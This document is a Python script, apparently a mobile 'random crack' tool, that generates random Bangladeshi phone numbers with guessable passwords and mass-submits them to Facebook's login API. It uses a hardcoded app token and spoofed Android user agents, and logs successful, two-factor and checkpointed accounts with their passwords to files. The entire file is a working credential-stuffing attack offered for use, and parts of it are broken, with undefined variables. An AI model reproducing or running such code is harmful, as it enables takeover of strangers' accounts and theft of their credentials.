#--------------------- [ INFO ] -------------------#
#INJOY THE OPEN SOURCE 
#ALLAH HAFEZ
#--------------------- [ MODEL ] -------------------#
import os
import time
import sys
from os import path
import urllib
import pip
import base64
import zlib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
#--------------------- [ FUMK ] -------------------#
jan = []
loop=0
oks=[]
cps=[]
twf=[]
#-------------- [ CREATION ] -----------------#
def joined(cid):
    if len(cid)==15:
        if cid[:10] in ['1000000000']       :creation = ' 2009'
        elif cid[:9] in ['100000000']       :creation = ' 2009'
        elif cid[:8] in ['10000000']        :creation = ' 2009'
        elif cid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = ' 2009'
        elif cid[:7] in ['1000006','1000007','1000008','1000009']:creation = ' 2010'
        elif cid[:6] in ['100001']          :creation = ' 2010 | 2010'
        elif cid[:6] in ['100002','100003'] :creation = ' 2011 | 2012'
        elif cid[:6] in ['100004']          :creation = ' 2012 | 2013'
        elif cid[:6] in ['100005','100006'] :creation = ' 2013 | 2014'
        elif cid[:6] in ['100007','100008'] :creation = ' 2014 | 2015'
        elif cid[:6] in ['100009']          :creation = ' 2015' 
        elif cid[:5] in ['10001']           :creation = ' 2015 | 2016'
        elif cid[:5] in ['10002']           :creation = ' 2016 | 2017'
        elif cid[:5] in ['10003']           :creation = ' 2018 | 2019'
        elif cid[:5] in ['10004']           :creation = ' 2019 | 2020'
        elif cid[:5] in ['10005']           :creation = ' 2020'
        elif cid[:5] in ['10006','10007','']:creation = ' 2021'
        elif cid[:5] in ['10008']           :creation = ' 2022'
        elif cid[:5] in ['10009']           :creation = ' 2023'
        else:creation=''
    elif len(cid) in [9,10]:
        creation = ' 2008 | 2009'
    elif len(cid)==8:
        creation = ' 2007 | 2008'
    elif len(cid)==7:
        creation = ' 2006 | 2007'
    else:creation=''
    return creation
#--------------------- [ CODE ] -------------------#
W='\033[1;37m' #WHITE
G='\033[38;5;46m'
F='\033[38;5;45m'
R='\033[38;5;196m'
#--------------------- [ LOGO ] -------------------#
fuck = ("""\033[38;96m  
     \033[38;5;36m╦ ╦╔═╗╔╦╗╦╔╦╗  ╔═╗╔═╗╦═╗╔═╗╔╗ ╦
     \033[38;5;37m╠═╣╠═╣║║║║║║║  ╠╣ ╠═╣╠╦╝╠═╣╠╩╗║
     \033[38;5;38m╩ ╩╩ ╩╩ ╩╩╩ ╩  ╚  ╩ ╩╩╚═╩ ╩╚═╝╩
\033[38;90m───────────────────────────────────────────
 \033[1;92m➤\033[1;97m FACEBOOK\033[38;5;196m  :\x1b[38;97m HAMIM ON PIRE
 \033[1;92m➤\033[1;97m VERSION \033[38;5;196m  :\x1b[38;97m 1.0.1
 \033[1;92m➤\033[1;97m STATUS \033[38;5;196m   :\x1b[38;92m PREMIUM
\033[38;90m───────────────────────────────────────────""")
#--------------------- [ DEF-LOGO X CLEAR ] -------------------#
def x():
    os.system('clear')
    print(fuck)
#--------------------- [ ALNEX ] -------------------#
def linex():
    print(f'\033[38;90m───────────────────────────────────────────')
#--------------------- [ MAIN ] -------------------#
def Main():
    x()
    print(' \033[38;5;196m[\x1b[38;5;46mA\033[38;5;196m]\033[1;97m RANDOM CRACK')
    print(' \033[38;5;196m[\x1b[38;5;46mE\033[38;5;196m]\033[1;97m EXIT');linex()
    xtx = input(' \033[38;5;196m[\x1b[38;5;46m?\033[38;5;196m]\033[1;97m CHOICE : ')
    if xtx in '1''A''a':
        rndmx()
    elif xtx in '2''E''e':
        print('Allah hafiz ')
        os.system('exit')
#--------------------- [ RNDM ] -------------------#
def rndmx():
    x()
    print('\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\033[1;97m Bd Sim Code : 017,019,018,016 ');linex()
    dog = input('\033[38;5;196m[\x1b[38;5;46m?\033[38;5;196m]\033[1;97m CODE : ')
    x()
    try:
        print('\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\033[1;97m Limit : 999,9999,99999');linex()
        limit = int(input('\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\033[1;97m Limit : '))
    except ValueError:
            limit = 5000
    for nmbr in range(limit):
            xxx = ''.join(random.choice(string.digits) for _ in range(8))
            jan.append(xxx)
    with tred(max_workers=30) as tanox:
            x()
            tl = str(len(jan))
            print(f' \033[1;92m➤\033[1;97m TOTAL IDS : \033[38;5;46m{str(len(jan))}')
            print(f' \033[1;92m➤\033[1;97m OPERATOR  : \033[38;5;46m{dog}')
            print(f' \033[1;92m➤\033[1;97m\x1b[38;5;46m\033[1;97m FIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE🚀');linex()
            
            for psx in jan:
                ids = dog+psx
                passlist = [psx,ids,ids[:8],ids[:7],'bangla']
                tanox.submit(sexx,ids,passlist)
    print(f' \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\033[1;97m TOTAL OK -{str(len(oks))}')
    linex()
#---------------------- [ UAA ] -------------------------#
FBLC = random.choice(['cs_CZ','es_ES','hi_IN','en_PK','en_US','id_ID','lt_LT','it_IT','he_IL'])
FBCR = random.choice(['Ufone','Sprint','FASTWEB','Azercell','Tele2You','Jio 4G','Jazz','EE','Tele2 LT','Banglalink','Oi','Vi India'])
FBDV = random.choice(['Redmi 7A','MI 8 Lite','Mi 9','M2101K7BG','Redmi Note 8T','M2010J19CG','Mi 9T','M2011K2C','M2003J15SC','Redmi Note 4','Mi A2 Lite','M2101K9G','M2006C3LG'])

def uaa():
        END = '[FBAN/FB4A;FBAV/'+str(random.randint(111,333))+'.0.0.'+str(random.randint(1,9))+'.'+str(random.randint(111,199))+';FBBV/'+str(random.randint(000000000,999999999))+';FBDM/{density='+str(random.randint(2,3))+'.'+str(random.randint(2,5))+',width=1080,height=14'+str(random.randint(00,99))+'};FBLC/'+str(FBLC)+';FBCR/'+str(FBCR)+';FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/'+str(FBDV)+';FBSV/'+str(random.randint(9,12))+';FBOP/1;FBCA/arm64-v8a:;]'
        ua = 'Dalvik/2.1.0 (Linux; U; Android '+str(random.randrange(5,14))+'; '+str(FBDV)+' Build/QP1A.'+str(random.randrange(111111,999999))+'.'+str(random.randrange(111,999))+') '+str(END)+''
        return ua
#--------------------- [ MTHD ] -------------------#

def sexx(ids,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r \033[1;92m➤ \033[38;97m[\x1b[38;92mHAMIM-XD\033[38;97m] [\033[1;92m{loop}\033[38;97m] [\x1b[38;5;46mOK:-{len(oks)}\033[38;97m]')
        sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        cat = {'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',                              
                                'error_detail_type':'button_with_disabled',                                
                                'enroll_misauth':'false',                             
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',}
                        header={'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent': "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'}      
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=cat,headers=header).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print(f'\r\r \033[1;92m➤\033[38;5;46m [HAMIM-OK] {str(uid)} | {pas} '+joined(cid)+'')
                                        cokix = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print(f' =COOKIE= : {cokix}')
                                        open('/sdcard/X-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif twf in str(po):
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = idf
                                if uid in oks:pass
                                else:
                                        print(f'\r\r \033[1;92m➤\033[38;5;45m [HAMIM-2F] {uid} | {pas}\033[1;37m' +joined(cid)+'')
                                        open('/sdcard/X-2F.txt','a').write(str(uid)+'|'+pas+'\n')
                                        twf.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r \033[1;92m➤\033[38;5;196m [HAMIM-CP] '+str(uid)+' | '+pas+'\033[1;37m' +joined(cid)+'')
                                        open('/sdcard/X-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#--------------------- [ END ] -------------------#
Main()
